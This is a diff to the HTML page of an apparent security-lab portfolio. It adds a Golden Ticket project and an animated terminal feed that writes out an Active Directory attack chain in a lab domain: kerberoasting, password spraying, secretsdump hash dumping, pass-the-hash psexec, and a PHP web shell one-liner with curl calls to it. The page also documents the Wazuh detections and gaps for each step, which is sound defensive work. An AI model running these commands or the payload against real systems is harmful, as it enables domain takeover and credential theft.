@@ -237,7 +237,6 @@
       border-bottom: 1px solid var(--border);
     }
     .mitre-techniques { padding: 6px 6px 8px; }
-    
     .mitre-tech {
       font-size: 10px;
       padding: 3px 6px;
@@ -249,48 +248,37 @@
       border: 1px solid var(--border);
       cursor: pointer;
       transition: all 0.15s ease;
-}
+    }
     .mitre-tech:hover {
       background: rgba(124,106,247,0.18);
       border-color: rgba(124,106,247,0.55);
       color: #fff;
       box-shadow: 0 0 8px rgba(124,106,247,0.3);
       transform: translateX(3px);
-}
+    }
     .mitre-tech.covered {
       background: rgba(0,212,170,0.12);
       border-color: rgba(0,212,170,0.3);
       color: var(--accent);
-}
+    }
     .mitre-tech.covered:hover {
       background: rgba(0,212,170,0.28);
       border-color: rgba(0,212,170,0.75);
       color: #fff;
       box-shadow: 0 0 10px rgba(0,212,170,0.4);
       transform: translateX(3px);
-}
+    }
     .mitre-tech.partial {
       background: rgba(240,165,0,0.1);
       border-color: rgba(240,165,0,0.25);
       color: var(--warn);
-}
+    }
     .mitre-tech.partial:hover {
       background: rgba(240,165,0,0.25);
       border-color: rgba(240,165,0,0.65);
       color: #fff;
       box-shadow: 0 0 10px rgba(240,165,0,0.3);
       transform: translateX(3px);
-  }
-    }
-    .mitre-tech.covered {
-      background: rgba(0,212,170,0.12);
-      border-color: rgba(0,212,170,0.3);
-      color: var(--accent);
-    }
-    .mitre-tech.partial {
-      background: rgba(240,165,0,0.1);
-      border-color: rgba(240,165,0,0.25);
-      color: var(--warn);
     }
     .mitre-legend {
       display: flex;
@@ -511,47 +499,9 @@
       opacity: 0.07; pointer-events: none;
     }
 
-    /* ── COMMAND FEED ── */
-    .cmd-feed {
-      background: #050608;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 0;
-      overflow: hidden;
-      font-family: var(--mono);
-    }
-    .cmd-feed-bar {
-      background: var(--surface);
-      border-bottom: 1px solid var(--border);
-      padding: 8px 14px;
-      display: flex; align-items: center; gap: 8px;
-      font-size: 11px; color: var(--muted);
-    }
-    .cmd-feed-dot {
-      width: 10px; height: 10px; border-radius: 50%;
-    }
-    .cmd-feed-body {
-      padding: 14px 16px;
-      height: 220px;
-      overflow: hidden;
-      position: relative;
-    }
-    .cmd-line {
-      font-size: 11px;
-      line-height: 1.7;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-    .cmd-line.prompt { color: var(--accent); }
-    .cmd-line.output { color: var(--muted); padding-left: 12px; }
-    .cmd-line.success { color: var(--success); padding-left: 12px; }
-    .cmd-line.danger  { color: var(--danger);  padding-left: 12px; }
-    .cmd-line.warn    { color: var(--warn);    padding-left: 12px; }
-    .cmd-cursor { display: inline-block; width: 7px; height: 12px; background: var(--accent); vertical-align: text-bottom; animation: blink 1s step-end infinite; }
-    @keyframes blink { 50% { opacity: 0; } }
+    
 
-    /* ── ALERT TIMELINE ── */
+/* ── ALERT TIMELINE ── */
     .alert-feed {
       background: #050608;
       border: 1px solid var(--border);
@@ -818,9 +768,9 @@
 
 <!-- STAT BAR -->
 <div class="stat-bar">
-  <div class="stat"><div class="stat-num" data-target="9">0</div><div class="stat-label">Projects</div></div>
+  <div class="stat"><div class="stat-num" data-target="10">0</div><div class="stat-label">Projects</div></div>
   <div class="stat"><div class="stat-num" data-target="6">0</div><div class="stat-label">Custom Rules</div></div>
-  <div class="stat"><div class="stat-num" data-target="4">0</div><div class="stat-label">AD Attacks</div></div>
+  <div class="stat"><div class="stat-num" data-target="5">0</div><div class="stat-label">AD Attacks</div></div>
   <div class="stat"><div class="stat-num" data-suffix="K" data-target="52">0</div><div class="stat-label">Suricata Sigs</div></div>
   <div class="stat"><div class="stat-num" data-prefix="<" data-target="10" data-suffix="m">&lt;10m</div><div class="stat-label">Domain → SYSTEM</div></div>
 </div>
@@ -934,7 +884,7 @@
         <div class="mitre-tactic-name">Persistence</div>
         <div class="mitre-techniques">
           <span class="mitre-tech covered" onclick="showMitre('T1505.003','Web Shell','covered','A web shell is a script uploaded to a web server that gives an attacker persistent remote access via HTTP — hard to detect since it blends with legitimate web traffic.','PHP one-liner (&lt;?php system($_GET[cmd]); ?&gt;) uploaded to DVWAs hackable/uploads directory. Detected by Wazuh built-in rule 31514 with MITRE T1505.003 pre-tagged, and by Suricata on the network layer.')">T1505.003 · Web Shell</span>
-          <span class="mitre-tech covered" onclick="showMitre('T1136','Create Account','covered','Creating new user accounts (local or domain) to maintain access even if the original compromise vector is closed.','Domain accounts created in lab.local for attack simulation: jsmith, sadmin (Domain Admin), svc_sql (service account). In a real attack, an adversary would add a backdoor account after DCSync.')">T1136 · Create Account</span>
+          <span class="mitre-tech covered" onclick="showMitre('T1558.001','Golden Ticket','covered','Forging a Kerberos TGT using the krbtgt account hash. The forged ticket is signed with the real key so DCs accept it as legitimate. Persists through password resets — only resetting krbtgt twice invalidates it.','krbtgt hash captured via DCSync. impacket-ticketer forged the ticket entirely offline — zero DC contact. Loaded via KRB5CCNAME and used with psexec -k -no-pass to get SYSTEM on DC01. Valid for 10 years by default. Wazuh caught the psexec service install (Event 7045) but not the forged ticket itself.')">T1558.001 · Golden Ticket</span>
           <span class="mitre-tech" onclick="showMitre('T1547','Boot or Logon Autostart Execution','not-covered','Placing malicious code in startup locations (registry Run keys, scheduled tasks, startup folders) so it executes automatically on every boot or logon.','Not demonstrated — the persistence in this lab was limited to dropping /tmp/attacker_persistence.sh. A full persistence chain would add a scheduled task or registry Run key.')">T1547 · Boot Autostart</span>
         </div>
       </div>
@@ -1135,6 +1085,7 @@
     <script>
     (function() {
       const canvas = document.getElementById('netmap');
+      if (!canvas) return;
       const ctx = canvas.getContext('2d');
       const tip = document.getElementById('nettip');
 
@@ -1503,15 +1454,27 @@
       <div>
         <div style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:10px;">Attack Terminal</div>
         <div class="cmd-feed">
-          <div class="cmd-feed-bar">
-            <span class="cmd-feed-dot" style="background:#e05252;"></span>
-            <span class="cmd-feed-dot" style="background:#f0a500;"></span>
-            <span class="cmd-feed-dot" style="background:#3ecf8e;"></span>
-            <span style="margin-left:4px;">kali@192.168.137.60 ~ </span>
+          <div class="cmd-feed-bar" style="flex-direction:column;gap:0;padding:0;">
+            <div style="display:flex;border-bottom:1px solid var(--border);">
+              <button class="cmd-tab-btn" data-tab="kali"  style="background:none;border:none;border-bottom:2px solid #e05252;padding:7px 14px;font-family:var(--mono);font-size:10px;color:#e05252;cursor:pointer;">KALI</button>
+              <button class="cmd-tab-btn" data-tab="docker"  style="background:none;border:none;border-bottom:2px solid transparent;padding:7px 14px;font-family:var(--mono);font-size:10px;color:#565c6e;cursor:pointer;">DOCKER</button>
+              <button class="cmd-tab-btn" data-tab="wazuh"  style="background:none;border:none;border-bottom:2px solid transparent;padding:7px 14px;font-family:var(--mono);font-size:10px;color:#565c6e;cursor:pointer;">WAZUH</button>
+              <div style="flex:1;"></div>
+              <div style="display:flex;align-items:center;gap:2px;padding:0 8px;border-left:1px solid var(--border);">
+                <button class="cmd-speed-btn" data-speed="0.5"  style="background:none;border:none;font-family:var(--mono);font-size:10px;color:#565c6e;cursor:pointer;padding:2px 5px;">0.5x</button>
+                <button class="cmd-speed-btn" data-speed="1"  style="background:none;border:none;font-family:var(--mono);font-size:10px;color:#00d4aa;cursor:pointer;padding:2px 5px;">1x</button>
+                <button class="cmd-speed-btn" data-speed="2"  style="background:none;border:none;font-family:var(--mono);font-size:10px;color:#565c6e;cursor:pointer;padding:2px 5px;">2x</button>
+                <button id="cmd-pause"  style="background:none;border:none;font-family:var(--mono);font-size:10px;color:#565c6e;cursor:pointer;padding:2px 8px;border-left:1px solid var(--border);margin-left:4px;">&#9646;&#9646; Pause</button>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:8px;padding:6px 12px;">
+              <span class="cmd-feed-dot" style="background:#e05252;"></span>
+              <span class="cmd-feed-dot" style="background:#f0a500;"></span>
+              <span class="cmd-feed-dot" style="background:#3ecf8e;"></span>
+              <span id="cmd-tab-label" style="font-family:var(--mono);font-size:10px;color:var(--muted);margin-left:4px;">kali@192.168.137.60 ~</span>
+            </div>
           </div>
-          <div class="cmd-feed-body" id="cmd-body">
-            <div class="cmd-line prompt">❯ <span class="cmd-cursor"></span></div>
-          </div>
+          <div class="cmd-feed-body" id="cmd-body"></div>
         </div>
       </div>
 
@@ -1724,6 +1687,42 @@
         </div>
       </div>
 
+      <!-- P10 -->
+      <div class="project" id="p10">
+        <div class="project-header" onclick="toggle('p10')">
+          <span class="project-num">10</span>
+          <div class="project-title-block">
+            <div class="project-title">Golden Ticket Attack — Persistent Domain Compromise ⭐</div>
+            <div class="project-tags">
+              <span class="tag tag-red">Golden Ticket</span>
+              <span class="tag tag-red">Kerberos Forge</span>
+              <span class="tag tag-orange">Persistence</span>
+              <span class="tag tag-blue">Detection Gap</span>
+            </div>
+          </div>
+          <span class="chevron">›</span>
+        </div>
+        <div class="project-body">
+          <p class="project-desc">Using the krbtgt hash captured during DCSync in project 8, a Golden Ticket was forged entirely offline — zero DC contact during creation. The forged Kerberos TGT was accepted by DC01 as legitimate, granting SYSTEM access via psexec -k -no-pass. Default ticket validity: 10 years. Survives all password resets until krbtgt is reset twice. Wazuh caught the psexec service install (Event 7045) but not the Golden Ticket authentication itself — an honest and critical detection gap documented in full.</p>
+          <div class="evidence-grid">
+            <div class="evidence-block">
+              <div class="evidence-label">Forgery</div>
+              <div class="evidence-value">Offline — no DC contact<br>krbtgt hash only<br>Valid 10 years default</div>
+            </div>
+            <div class="evidence-block">
+              <div class="evidence-label">Detection</div>
+              <div class="evidence-value">Event 7045 · Rule 92650<br>Service install caught<br>Ticket auth — NOT detected</div>
+            </div>
+          </div>
+          <div class="mitre-badge-list">
+            <span class="mitre-badge">T1558.001 · Golden Ticket</span>
+            <span class="mitre-badge">T1021.002 · Remote Services SMB</span>
+            <span class="mitre-badge">T1569.002 · Service Execution</span>
+          </div>
+          <p class="honest-note">The Golden Ticket itself was undetected by Wazuh — only the psexec consequence fired. Production detection requires Microsoft Defender for Identity or equivalent DC-level Kerberos inspection. Documented honestly as the most important detection gap in the portfolio.</p>
+        </div>
+      </div>
+
     </div>
   </section>
 
@@ -1826,7 +1825,7 @@
   /* ── TERMINAL ANIMATION ── */
   const lines = [
     { el: 't1', html: '<span class="prompt">❯</span> <span class="output">initialising lab environment...</span>' },
-    { el: 't2', html: '<span class="prompt">❯</span> <span class="ok">✓</span> <span class="output">9 projects loaded · 6 custom rules active</span>' },
+    { el: 't2', html: '<span class="prompt">❯</span> <span class="ok">✓</span> <span class="output">10 projects loaded · 6 custom rules active</span>' },
     { el: 't3', html: '<span class="prompt">❯</span> <span class="ok">✓</span> <span class="output">wazuh agents connected · suricata running</span>' },
     { el: 't4', html: '<span class="prompt">❯</span> <span class="warn">!</span> <span class="output">domain compromise in &lt;10m from 1 standard user</span>' },
   ];
@@ -1885,6 +1884,7 @@ window.addEventListener('scroll', function() {
 /* ── MATRIX RAIN ── */
 (function() {
   const canvas = document.getElementById('matrix-canvas');
+  if (!canvas) return;
   const ctx = canvas.getContext('2d');
   const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモABCDEF0123456789';
   let cols, drops, W, H;
@@ -1912,165 +1912,369 @@ window.addEventListener('scroll', function() {
 })();
 
 /* ── COMMAND FEED ── */
-(function() {
-  const sequences = [
-    [
-      {t:'prompt', txt:'impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 192.168.137.50 -request'},
-      {t:'output', txt:'ServicePrincipalName          Name     PasswordLastSet'},
-      {t:'output', txt:'----------------------------  -------  --------------------'},
-      {t:'output', txt:'MSSQLSvc/dc01.lab.local:1433  svc_sql  2026-08-14 04:43:39'},
-      {t:'warn',   txt:'$krb5tgs$23$*svc_sql$LAB.LOCAL$...a3f9e0b2c741d8...'},
-      {t:'success',txt:'[+] Hash saved to kerberoast.txt'},
-    ],
-    [
-      {t:'prompt', txt:'john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs'},
-      {t:'output', txt:'Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23)'},
-      {t:'output', txt:'Press q or Ctrl-C to abort...'},
-      {t:'success',txt:'Summer2024!      (svc_sql)'},
-      {t:'success',txt:'1g 0:00:00:00 DONE - Session completed'},
-    ],
-    [
-      {t:'prompt', txt:'nxc smb 192.168.137.50 -u jsmith sadmin svc_sql -p PASS --continue-on-success'},
-      {t:'output', txt:'SMB  192.168.137.50  445  DC01  Windows Server 2019'},
-      {t:'danger', txt:'[-] lab.local\\jsmith:Welcome2024 STATUS_LOGON_FAILURE'},
-      {t:'success',txt:'[+] lab.local\\sadmin:Welcome2024 (Pwn3d!)'},
-      {t:'danger', txt:'[-] lab.local\\svc_sql:Welcome2024 STATUS_LOGON_FAILURE'},
-    ],
-    [
-      {t:'prompt', txt:'impacket-secretsdump lab.local/sadmin@192.168.137.50'},
-      {t:'output', txt:'[*] Dumping Domain Credentials via DRSUAPI'},
-      {t:'warn',   txt:'Administrator:500:aad3b435:fbf12d80563e496af62ad2c748963cd2:::'},
-      {t:'warn',   txt:'krbtgt:502:aad3b435:88933a6959dc13a2f648c974713839bd:::'},
-      {t:'warn',   txt:'sadmin:1104:aad3b435:7099909e93b8345e3def4331473b8235:::'},
-      {t:'success',txt:'[*] All domain hashes extracted successfully'},
-    ],
-    [
-      {t:'prompt', txt:'impacket-psexec -hashes aad3b435:fbf12d80563e496af62ad2c748963cd2 Administrator@192.168.137.50'},
-      {t:'output', txt:'[*] Found writable share ADMIN$'},
-      {t:'output', txt:'[*] Uploading file xFpUkDmp.exe'},
-      {t:'output', txt:'[*] Creating service Ppxk on 192.168.137.50'},
-      {t:'output', txt:'[*] Starting service Ppxk...'},
-      {t:'success',txt:'C:\\Windows\\system32> whoami'},
-      {t:'danger', txt:'nt authority\\system'},
-    ],
-    [
-      {t:'prompt', txt:'SharpHound.exe -c All --domain lab.local --ldapusername jsmith'},
-      {t:'output', txt:'[+] Found usable DC: DC01.lab.local'},
-      {t:'output', txt:'[+] Beginning LDAP search for lab.local'},
-      {t:'output', txt:'[+] Status: 97 objects finished (+97 3.7/s)'},
-      {t:'success',txt:'[+] Enumeration finished in 00:00:26'},
-      {t:'success',txt:'[+] Output: 20260815163716_BloodHound.zip'},
-    ],
-  ];
+</script>
 
-  const body = document.getElementById('cmd-body');
-  let seqIdx = 0, lineIdx = 0, charIdx = 0;
-  let lines = [];
-  let typing = false;
+<script>
+/* ── COMMAND FEED ── */
+var Feed = {
+  timer: null,
+  paused: false,
+  speed: 1,
+  tab: 'kali',
+  seqIdx: 0,
+  lineIdx: 0,
+  typing: false,
 
-  function addLine(type, text) {
-    const div = document.createElement('div');
-    div.className = 'cmd-line ' + type;
-    if (type === 'prompt') div.innerHTML = '❯ ';
-    body.appendChild(div);
-    // keep max 12 lines
-    while (body.children.length > 13) body.removeChild(body.firstChild);
-    body.scrollTop = body.scrollHeight;
-    return div;
-  }
+  tabs: {
+    kali: {
+      label: 'kali@192.168.137.60 ~',
+      color: '#e05252',
+      seqs: [
+        [
+          {t:'prompt', txt:'impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip 192.168.137.50 -request'},
+          {t:'output', txt:'ServicePrincipalName          Name     PasswordLastSet'},
+          {t:'output', txt:'----------------------------  -------  -------------------------'},
+          {t:'output', txt:'MSSQLSvc/dc01.lab.local:1433  svc_sql  2026-08-14 04:43:39'},
+          {t:'warn',   txt:'$krb5tgs$23$*svc_sql$LAB.LOCAL$...61c19e0fdcd01821...'},
+          {t:'success',txt:'[+] TGS hash written to kerberoast.txt'},
+        ],
+        [
+          {t:'prompt', txt:'john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs'},
+          {t:'output', txt:'Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23)'},
+          {t:'output', txt:'Will run 2 OpenMP threads'},
+          {t:'success',txt:'Summer2024!      (?)     -- svc_sql cracked'},
+          {t:'success',txt:'1g 0:00:00:00 DONE -- Session completed.'},
+        ],
+        [
+          {t:'prompt', txt:'nxc smb 192.168.137.50 -u jsmith sadmin svc_sql -p [SPRAY] --continue-on-success'},
+          {t:'output', txt:'SMB  192.168.137.50  445  DC01  Windows Server 2019 (domain:lab.local)'},
+          {t:'danger', txt:'SMB  DC01  [-] lab.local/jsmith STATUS_LOGON_FAILURE'},
+          {t:'success',txt:'SMB  DC01  [+] lab.local/sadmin (Pwn3d!)'},
+          {t:'danger', txt:'SMB  DC01  [-] lab.local/svc_sql STATUS_LOGON_FAILURE'},
+        ],
+        [
+          {t:'prompt', txt:'impacket-secretsdump lab.local/sadmin@192.168.137.50'},
+          {t:'output', txt:'[*] Dumping Domain Credentials via DRSUAPI method'},
+          {t:'warn',   txt:'Administrator:500:aad3b435:fbf12d80563e496af62ad2c748963cd2'},
+          {t:'warn',   txt:'krbtgt:502:aad3b435:88933a6959dc13a2f648c974713839bd'},
+          {t:'warn',   txt:'sadmin:1104:aad3b435:7099909e93b8345e3def4331473b8235'},
+          {t:'warn',   txt:'svc_sql:1105:aad3b435:72f0eefcc213ea8f350773b831cf2c9c'},
+          {t:'success',txt:'[*] All hashes extracted. Cleaning up...'},
+        ],
+        [
+          {t:'prompt', txt:'impacket-psexec -hashes aad3b435:fbf12d80563e496af62ad2c748963cd2 Administrator@192.168.137.50'},
+          {t:'output', txt:'[*] Found writable share ADMIN$'},
+          {t:'output', txt:'[*] Uploading file xFpUkDmp.exe'},
+          {t:'output', txt:'[*] Creating service Ppxk on 192.168.137.50...'},
+          {t:'output', txt:'[*] Starting service Ppxk...'},
+          {t:'danger', txt:'C:/Windows/system32> whoami'},
+          {t:'danger', txt:'nt authority/system'},
+        ],
+        [
+          {t:'prompt', txt:'SharpHound.exe -c All --domain lab.local --ldapusername jsmith'},
+          {t:'output', txt:'[+] Found usable DC: DC01.lab.local'},
+          {t:'output', txt:'[+] Beginning LDAP search for lab.local'},
+          {t:'output', txt:'[+] Status: 97 objects finished (+97 3.7/s) -- 45MB RAM'},
+          {t:'success',txt:'[+] Enumeration finished in 00:00:26'},
+          {t:'success',txt:'[+] Output: 20260815163716_BloodHound.zip'},
+        ],
+      ],
+    },
+    docker: {
+      label: 'cyberuser@dockervm ~',
+      color: '#f0a500',
+      seqs: [
+        [
+          {t:'prompt', txt:'docker ps --format "table {{.Names}} {{.Status}} {{.Ports}}"'},
+          {t:'output', txt:'NAMES          STATUS        PORTS'},
+          {t:'output', txt:'tunnel-client  Up 24 hours'},
+          {t:'output', txt:'tunnel-server  Up 24 hours'},
+          {t:'output', txt:'dvwa           Up 2 hours    0.0.0.0:8082->80/tcp'},
+          {t:'output', txt:'juice-shop     Up 2 hours    0.0.0.0:3000->3000/tcp'},
+        ],
+        [
+          {t:'prompt', txt:'docker logs --tail 5 c2-server'},
+          {t:'output', txt:'C2 sim server listening on port 8000...'},
+          {t:'success',txt:'c2sim: checkin timestamp=2026-07-26T10:17:44 src=172.18.0.3 path=/checkin'},
+          {t:'success',txt:'c2sim: checkin timestamp=2026-07-26T10:17:58 src=172.18.0.3 path=/checkin'},
+          {t:'success',txt:'c2sim: checkin timestamp=2026-07-26T10:18:11 src=172.18.0.3 path=/checkin'},
+        ],
+        [
+          {t:'prompt', txt:'tail -3 ~/dns-tunnel-sim/logs/queries.log'},
+          {t:'warn',   txt:'dnstunnel: qname=OVZWK4R5MFSG22LOHNYGC43.tunnel.local decoded=user=admin;pass=SuperSecr'},
+          {t:'warn',   txt:'dnstunnel: qname=MV2DCMRTHNUG643UHVUW45DF.tunnel.local decoded=et123;host=internal-db-01'},
+          {t:'warn',   txt:'dnstunnel: qname=HN2G623FNY6WK6KKNBREOY3J.tunnel.local decoded=;token=eyJhbGciOiJIUzI1Ni'},
+        ],
+        [
+          {t:'prompt', txt:'curl -s "http://localhost:8082/hackable/uploads/shell.php?cmd=id"'},
+          {t:'success',txt:'uid=33(www-data) gid=33(www-data) groups=33(www-data)'},
+          {t:'prompt', txt:'curl -s "http://localhost:8082/hackable/uploads/shell.php?cmd=hostname"'},
+          {t:'output', txt:'449b4bc2d562'},
+        ],
+        [
+          {t:'prompt', txt:'sudo tail -4 /var/log/suricata/fast.log'},
+          {t:'danger', txt:'[1:2034635:4] ET INFO Python BaseHTTP ServerBanner {TCP} 172.18.0.2:8000->172.18.0.3:48528'},
+          {t:'danger', txt:'[1:2034635:4] ET INFO Python BaseHTTP ServerBanner {TCP} 172.18.0.2:8000->172.18.0.3:58276'},
+          {t:'danger', txt:'[1:2034635:4] ET INFO Python BaseHTTP ServerBanner {TCP} 172.18.0.2:8000->172.18.0.3:37164'},
+          {t:'output', txt:'52238 rules loaded -- 3 interfaces -- IDS mode active'},
+        ],
+      ],
+    },
+    wazuh: {
+      label: 'cyberuser@wazuh ~',
+      color: '#00d4aa',
+      seqs: [
+        [
+          {t:'prompt', txt:'sudo /var/ossec/bin/wazuh-logtest < /tmp/testline.txt'},
+          {t:'output', txt:'Starting wazuh-logtest v4.8.2'},
+          {t:'output', txt:'**Phase 1: Completed pre-decoding.'},
+          {t:'output', txt:'**Phase 2: Completed decoding.'},
+          {t:'success',txt:'  name: dnstunnel'},
+          {t:'success',txt:'  dns.query: HN2G623FNY6WK6K.tunnel.local.'},
+          {t:'success',txt:'  srcip: 172.19.0.3'},
+          {t:'output', txt:'**Phase 3: Completed filtering (rules).'},
+          {t:'warn',   txt:'  id: 100041  level: 10  Suspicious DNS query to tunnel.local'},
+          {t:'warn',   txt:'**Alert to be generated.'},
+        ],
+        [
+          {t:'prompt', txt:'sudo grep "100053" /var/ossec/logs/alerts/alerts.log | tail -2'},
+          {t:'danger', txt:'Rule: 100053 (level 14) LATERAL MOVEMENT: Multiple web shell commands'},
+          {t:'danger', txt:'Rule: 100053 (level 14) LATERAL MOVEMENT: Multiple web shell commands'},
+          {t:'output', txt:'Src IP: 192.168.137.1 | Agent: docker-host'},
+        ],
+        [
+          {t:'prompt', txt:'sudo /var/ossec/bin/agent_control -l'},
+          {t:'output', txt:'Wazuh agent_control. List of available agents:'},
+          {t:'success',txt:'  ID: 001  Name: wazuh-server    IP: 192.168.137.10  Active'},
+          {t:'success',txt:'  ID: 003  Name: docker-host     IP: 192.168.137.30  Active'},
+          {t:'success',txt:'  ID: 004  Name: DC01            IP: 192.168.137.50  Active'},
+          {t:'output', txt:'3 agents connected -- all reporting.'},
+        ],
+        [
+          {t:'prompt', txt:'sudo cat /var/ossec/etc/rules/local_rules.xml | grep "rule id"'},
+          {t:'output', txt:'  rule id="100030" -- C2 simulator check-in observed'},
+          {t:'output', txt:'  rule id="100031" -- Possible C2 beaconing: 5+ check-ins/90s'},
+          {t:'output', txt:'  rule id="100040" -- DNS query observed via tunnel simulator'},
+          {t:'output', txt:'  rule id="100041" -- Suspicious DNS query to tunnel.local'},
+          {t:'output', txt:'  rule id="100042" -- High volume DNS queries -- tunneling likely'},
+          {t:'output', txt:'  rule id="100053" -- LATERAL MOVEMENT: active attack chain'},
+        ],
+      ],
+    },
+  },
 
-  function typeChar(el, text, i, cb) {
-    if (i >= text.length) { cb && cb(); return; }
-    el.textContent = (el.className.includes('prompt') ? '❯ ' : '') + text.slice(0, i+1);
-    const speed = el.className.includes('prompt') ? 28 : 4;
-    setTimeout(() => typeChar(el, text, i+1, cb), speed + Math.random()*10);
-  }
+  init: function() {
+    try {
+      this.body = document.getElementById('cmd-body');
+      if (!this.body) return;
+      this.start();
+    } catch(e) { console.error('Feed init error:', e); }
+  },
 
-  function runSequence() {
-    const seq = sequences[seqIdx % sequences.length];
-    if (lineIdx >= seq.length) {
-      seqIdx++;
-      lineIdx = 0;
-      setTimeout(() => {
-        // add blank gap
-        addLine('output', '');
-        runSequence();
-      }, 1800);
+  start: function() {
+    this.stop();
+    this.seqIdx = 0;
+    this.lineIdx = 0;
+    this.paused = false;
+    this.typing = false;
+    this.body.innerHTML = '';
+    this.next();
+  },
+
+  stop: function() {
+    if (this.timer) { clearTimeout(this.timer); this.timer = null; }
+    this.typing = false;
+  },
+
+  next: function() {
+    var self = this;
+    if (self.paused) return;
+    try {
+      var tab = self.tabs[self.tab];
+      var seq = tab.seqs[self.seqIdx % tab.seqs.length];
+      if (self.lineIdx >= seq.length) {
+        self.seqIdx++;
+        self.lineIdx = 0;
+        self.addLine('output', '');
+        self.timer = setTimeout(function() { self.next(); }, 1200 / self.speed);
+        return;
+      }
+      var item = seq[self.lineIdx];
+      var el = self.addLine(item.t, '');
+      var isP = item.t === 'prompt';
+      self.typing = true;
+      self.typeText(el, item.txt, 0, isP, function() {
+        self.typing = false;
+        self.lineIdx++;
+        var delay = isP ? 280 : 70;
+        self.timer = setTimeout(function() { self.next(); }, delay / self.speed);
+      });
+    } catch(e) { console.error('Feed next error:', e); }
+  },
+
+  typeText: function(el, txt, i, isP, cb) {
+    var self = this;
+    if (self.paused) {
+      el._resume = function() { self.typeText(el, txt, i, isP, cb); };
       return;
     }
-    const item = seq[lineIdx];
-    const el = addLine(item.t, '');
-    typeChar(el, item.txt, 0, () => {
-      lineIdx++;
-      const delay = item.t === 'prompt' ? 400 : 120;
-      setTimeout(runSequence, delay);
+    if (i >= txt.length) { cb(); return; }
+    var prefix = isP ? '\u276F ' : '';
+    el.textContent = prefix + txt.slice(0, i + 1);
+    self.body.scrollTop = self.body.scrollHeight;
+    var ms = isP ? 20 + Math.random() * 10 : 3;
+    self.timer = setTimeout(function() { self.typeText(el, txt, i + 1, isP, cb); }, ms / self.speed);
+  },
+
+  addLine: function(type, txt) {
+    var colors = {prompt:this.tabs[this.tab].color, output:'#565c6e', success:'#3ecf8e', warn:'#f0a500', danger:'#e05252'};
+    var div = document.createElement('div');
+    div.className = 'cmd-line';
+    div.style.color = colors[type] || '#c9cdd6';
+    div.style.fontSize = '11px';
+    div.style.lineHeight = '1.7';
+    div.style.whiteSpace = 'nowrap';
+    div.style.overflow = 'hidden';
+    div.style.textOverflow = 'ellipsis';
+    this.body.appendChild(div);
+    while (this.body.children.length > 14) this.body.removeChild(this.body.firstChild);
+    this.body.scrollTop = this.body.scrollHeight;
+    return div;
+  },
+
+  switchTab: function(tab) {
+    this.stop();
+    this.tab = tab;
+    document.querySelectorAll('.cmd-tab-btn').forEach(function(b) {
+      var active = b.dataset.tab === tab;
+      b.style.borderBottomColor = active ? Feed.tabs[tab].color : 'transparent';
+      b.style.color = active ? Feed.tabs[tab].color : '#565c6e';
     });
-  }
+    var lbl = document.getElementById('cmd-tab-label');
+    if (lbl) lbl.textContent = this.tabs[tab].label;
+    this.start();
+  },
 
-  setTimeout(runSequence, 1000);
-})();
-
-/* ── ALERT TIMELINE ── */
-(function() {
-  const alerts = [
-    {time:'08:44:24', level:6,  lvlClass:'lvl-6',  desc:'Simple shell.php command execution.'},
-    {time:'08:44:32', level:6,  lvlClass:'lvl-6',  desc:'Simple shell.php command execution.'},
-    {time:'08:45:00', level:14, lvlClass:'lvl-14', desc:'LATERAL MOVEMENT: Multiple web shell commands — active attack chain'},
-    {time:'08:50:12', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — NTLM auth possible pass-the-hash'},
-    {time:'08:50:12', level:5,  lvlClass:'lvl-6',  desc:'Logon failure - Unknown user or bad password.'},
-    {time:'08:56:58', level:14, lvlClass:'lvl-14', desc:'LATERAL MOVEMENT: Multiple web shell commands — active attack chain'},
-    {time:'09:44:09', level:3,  lvlClass:'lvl-3',  desc:'C2 simulator check-in observed'},
-    {time:'09:44:23', level:3,  lvlClass:'lvl-3',  desc:'Suricata: ET INFO Python BaseHTTP ServerBanner'},
-    {time:'09:45:07', level:10, lvlClass:'lvl-10', desc:'Suspicious DNS query to tunnel.local — possible DNS tunneling'},
-    {time:'09:45:13', level:12, lvlClass:'lvl-12', desc:'High volume DNS queries to tunnel domain — DNS tunneling likely'},
-    {time:'10:17:44', level:3,  lvlClass:'lvl-3',  desc:'C2 simulator check-in observed'},
-    {time:'10:17:58', level:12, lvlClass:'lvl-12', desc:'Possible C2 beaconing: 5+ check-ins from same source/90s'},
-    {time:'10:44:09', level:3,  lvlClass:'lvl-3',  desc:'Suricata: ET INFO Python BaseHTTP ServerBanner'},
-    {time:'10:49:39', level:6,  lvlClass:'lvl-6',  desc:'New file created in /tmp — possible attacker persistence'},
-    {time:'10:50:12', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — NTLM auth possible pass-the-hash'},
-    {time:'05:39:41', level:6,  lvlClass:'lvl-6',  desc:'Kerberos service ticket requested — encryption type 0x17 (RC4)'},
-    {time:'05:55:08', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — sadmin NTLM possible pass-the-hash'},
-    {time:'05:56:58', level:12, lvlClass:'lvl-12', desc:'Possible C2 beaconing: 5+ check-ins from same source/90s'}
-  ];
-
-  const body = document.getElementById('alert-body');
-  let idx = 0;
-
-  if (!body) return;
-
-  function addAlert() {
-    const a = alerts[idx % alerts.length];
-    const row = document.createElement('div');
-    row.className = 'alert-row';
-    row.style.opacity = '0';
-    row.style.transition = 'opacity 0.4s';
-    row.innerHTML =
-      '<span class="alert-time">' + a.time + '</span>' +
-      '<span class="alert-level ' + a.lvlClass + '">' + a.level + '</span>' +
-      '<span class="alert-desc">' + a.desc + '</span>';
-    body.appendChild(row);
-    
-    setTimeout(() => { row.style.opacity = '1'; }, 20);
-
-    // FIXED SYNCHRONOUS TRIMMING
-    if (body.children.length > 14) {
-      const old = body.firstChild;
-      if (old) {
-        body.removeChild(old);
+  togglePause: function() {
+    this.paused = !this.paused;
+    var btn = document.getElementById('cmd-pause');
+    if (btn) {
